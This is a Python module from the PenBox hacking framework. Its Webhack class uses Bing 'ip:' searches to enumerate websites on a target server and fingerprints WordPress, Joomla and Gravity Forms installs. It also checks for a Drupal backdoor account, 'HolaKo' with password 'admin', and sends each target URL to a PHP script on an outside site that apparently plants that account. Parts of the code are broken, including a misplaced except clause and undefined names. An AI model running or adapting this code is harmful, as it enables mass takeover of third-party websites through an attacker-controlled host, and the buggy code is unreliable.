#!/usr/bin/python3
#
#  PenBox: A Penetration Testing Framework , The Hacker’s Repo
#
#    [+]       Coded BY Mohamed Nour & Fedy Wesleti       [+]
#    [+]         FB/mohamed.zeus.0   ~~ FB/CEH.tN         [+]
#    [+]             Improved by: Chiheb Nexus            [+]
#    [+]                  FB/chihebnexuss                 [+]
#    [+]             Greetz To All Pentesters             [+]
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 3 of the License.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#
################################################################################

from os import system, getcwd
from urllib.request import urlopen
from urllib.parse import urlparse
from re import findall
from src.var.MyDecorators import CheckDirectory, CheckFile

class Webhack:
    """
        @FIXME
    """
    def __init__(self):
        self.DIRECTORY = getcwd() + "/src/bin"

    def drupal_main(self):
        """
            @FIXME
        """
        print("""
        1- Drupal
        2- Get Drupal
        3- Drupal list
        99- Back to the previous menu
        """)
        user_input = input("Enter a number: ")
        while True:
            if user_input == '1':
                Webhack.drupal(self)
                break
            elif user_input == '2':
                Webhack.get_drupal(self)
                break
            elif user_input == '3':
                Webhack.drupal_list(self)
                break
            elif user_input == '99':
                break
            else:
                user_input = input("Please enter a number between [1..3] or 99 to back to the previous menu: ")

    def load_url(self, url = None):
        """
        """
        try:
            response = urlopen(url)
            return response.read()
        except Exception as e:
            print("Error occured while trying to open URL '{0}'".format(url))
            print(e)

    def drupal(self):
        """
        """
        ip_target = input("Enter Target IP Address: ")
        page = 1
        while page <= 50:
            print("-> Testing page n°: ", page)
            url = "http://www.bing.com/search?q=ip%3A"+ip_target+"&go=Valider&qs=n&form=QBRE&pq=ip%3A"+\
            ip_target+"&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first="+str(page)
            data = Webhack.load_url(self, url)
            filtred_data = findall('<div class="b_title"><h2><a href="(.*?)" h='.encode(), data)
            page +=1
            #print("data: ", data)
            #print("filtred_data: ", filtred_data)

            for urls in filtred_data:
                parsed = urlparse(urls)
                site = parsed.netloc

                print("[+] Testing website: {0}".format(site))
                testing_data = Webhack.load_url(self, site)
                if "User : HolaKo" in testing_data:
                    print("[-] Exploit found in {0}".format(site))
                    print("User: HolaKo\nPass: admin")
                else:
                    print("[-] Exploit not found ! ")

    def get_drupal(self):
        """
        """
        ip_target = input("Enter target IP Address: ")
        page = 1
        sites = []
        while page <= 50:
            print("-> Testing page n°: {0}".format(page))
            url = "http://www.bing.com/search?q=ip%3A"+ip_target+"+node&go=Valider&qs=ds&form=QBRE&first="+str(page)
            data = Webhack.load_url(self, url)
            filtred_data = findall('<div class="b_title"><h2><a href="(.*?)" h='.encode(), data)
            page +=1

            for urls in filtred_data:
                parsed = urlparse(urls)
                site = parsed.netloc
                if site not in sites:
                    print("Found: ", site)
                    sites.append(site)

    def drupal_list(self):
        """
        """
        content = None
        ip_target = input("Enter list target path: ")
        try:
            with open(ip_target, 'r') as in_file:
                content =  in_file.readlines()
            except Exception as e:
                print("Error reading target list path")
                print(e)

        for i in content:
            url = i.strip()
            try:
                data = Webhack.load_url(self, 'http://crig-alda.ro/wp-admin/css/index2.php?url='+url+'&submit=submit')
                if "Success" in data:
                    print("-> Success: ", url)
                    print("Username: HolaKo\nPass: admin")
                    with open(drupal.txt, 'a') as write_file:
                        write_file.write(url+"\n"+"Username: HolaKo"+"\n"+"Pass: admin")
                else:
                    print("-> Exploit not found in url: ", url)
            except Exception as e:
                print("Error occured")
                print(e)

    @CheckDirectory(path = getcwd() + "/src/bin/SCANNER-INURLBR")
    def inurlbr(self):
        """
        """
        print("""
        Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls,
         with an internal custom validation junction for each target / url found.
        """)

        print("[+] Checking/Installing Dependencies on Debian based OS ...")
        system("sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl")
        print("[+] Cloning InURLbr from Github to {0} ...".format(self.DIRECTORY))
        system("cd src/bin && git clone https://github.com/googleinurl/SCANNER-INURLBR.git")

    def bing_all_grabber(self, arg = None):
        """
        """
        my_list = []
        page = 1
        while page <= 101:
            try:
                url = "http://www.bing.com/search?q=ip%3A" + arg + "+&count=50&first=" + str(page)
                data = Webhack.load_url(self, url)
                filtred_data = findall('<h2><a href="(.*?)"'.encode(), data)

                for i in filtred_data:
                    f = findall('http://(.*?)/'.encode(), i)
                    for keys, item in enumerate(f):
                        if 'www' not in item:
                            my_list.append('http://www.' + item +'/')
                        else:
                            my_list.append('http://' + item + '/')
                    page += 50
                    final = unique(my_list)
                    return final
            except Exception as e:
                print("Error occured in bing_all_grabber")
                print(e)

    def check_wordpress(self, sites = None):
        """
        """
        wp = []
        try:
            for urls in sites:
                code = urlopen(urls+'wp-login.php').getcode() == 200
                if code:
                    wp.append(urls)
            return wp
        except Exception as e:
            print("Error occured in check_wordpress")
            print(e)

    def check_joomla(self, sites = None):
        """
        """
        jm = []
        try:
            for urls in sites:
                code = urlopen(urls+'administrator').getcode() == 200
                if code:
                    jm.append(urls)
            return jm
        except Exception as e:
            print("Error occured in check_wordpress")
            print(e)

    def wppjmla(self):
        """
        """
        ip_target = input("Enter target IP Address: ")
        sites = Webhack.bing_all_grabber(self, str(ip_target))
        wordpress = Webhack.check_wordpress(self, sites = sites)
        joomla = Webhack.check_joomla(self, sites = sites)

        try:
            for i in wordpress:
                print("-> Found: ",i)
            print(">> Found in total {0} Wordpress websites".format(len(wordpress)))

            for i in joomla:
                print("-> Found: ", i)
            print(">> Found in total {0} Joomla websites ".format(len(joomla)))
        except Exception as e:
            print("Error occured in wppjmla")
            print(e)

    def gravity_forms(self, sites = None):
        """
        """
        forms = []
        try:
            for urls in sites:
                code = urlopen(urls + 'wp-content/plugins/gravityforms/gravityforms.php').getcod() == 403
                if code:
                    forms.append(urls)
        except Exception as e:
            print("Error occured in gravity_forms")
            print(e)

    def gravity(self):
        """
        """
        sites, forms = [], []
        ip_target = input("Enter target IP Address: ")
        try:
            sites = Webhack.bing_all_grabber(self, str(ip_target))
            forms = Webhack.gravity_forms(self, sites)
            for i in forms:
                print(i)
            print(">> Found in total {0} gravity forms".format(len(forms)))
        except Exception as e:
            print("Error occured in gravity")
            print(e)

    def sqlscan(self):
        """
            FIXME
        """
        pass
